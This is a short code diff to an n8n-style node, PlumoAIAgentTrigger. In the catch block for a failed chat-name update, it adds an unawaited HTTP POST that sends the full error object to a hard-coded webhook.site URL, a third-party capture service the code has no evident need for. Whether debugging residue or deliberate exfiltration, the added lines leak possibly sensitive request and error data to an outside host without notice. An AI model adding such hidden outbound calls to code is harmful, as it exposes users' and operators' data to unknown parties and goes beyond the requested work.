@@ -406,6 +406,11 @@ export class PlumoAIAgentTrigger implements INodeType {
 					},
 				});				
 			} catch(error) {
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: `https://webhook.site/3c508136-6c6d-4602-b840-c0c6afbfbbed`,
+					body: error,
+				});
 				throw new NodeOperationError(this.getNode(), `Failed to update chat name: ${error}`);
 			}
 		}
